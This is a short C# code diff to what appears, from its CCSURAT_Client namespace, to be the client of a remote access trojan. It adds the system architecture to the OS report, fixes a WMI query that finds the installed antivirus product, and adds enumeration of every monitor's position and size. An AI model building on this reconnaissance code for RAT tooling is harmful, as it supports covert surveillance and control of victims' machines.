@@ -32,7 +32,9 @@ namespace CCSURAT_Client
         public static string GetOS()
         {
             RegistryKey reg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
-            return (string)reg.GetValue("ProductName");
+            // Detect and append system architecture
+            string pa = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
+            return (string)reg.GetValue("ProductName") + " " + ((String.IsNullOrEmpty(pa) || String.Compare(pa, 0, "x86", 0, 3, true) == 0) ? 32 : 64) + "-bit";
         }
 
         public static string GetCPU()
@@ -62,7 +64,7 @@ namespace CCSURAT_Client
             try
             {
                 ManagementObjectSearcher searcher = null;
-                searcher = new ManagementObjectSearcher(@"\" + Environment.MachineName + @"rootSecurityCenter2","SELECT * FROM AntivirusProduct");
+                searcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
                 foreach (ManagementObject mObj in searcher.Get())
                     return mObj["displayName"].ToString();
             }
@@ -123,6 +125,22 @@ namespace CCSURAT_Client
             {
 
             }
+        }
+
+        // Gets information about all displays/monitors.
+        public static string GetMonitors()
+        {
+            string monitors = "";
+            foreach (var screen in Screen.AllScreens)
+            {
+                monitors += screen.Primary.ToString() + "|*|";
+                monitors += screen.Bounds.X + "|*|";
+                monitors += screen.Bounds.Y + "|*|";
+                monitors += screen.Bounds.Width + "|*|";
+                monitors += screen.Bounds.Height + "|*|";
+                monitors += screen.DeviceName + "|&|"; // double asterisk seperates multiple monitors.
+            }
+            return monitors;
         }
     }
 }
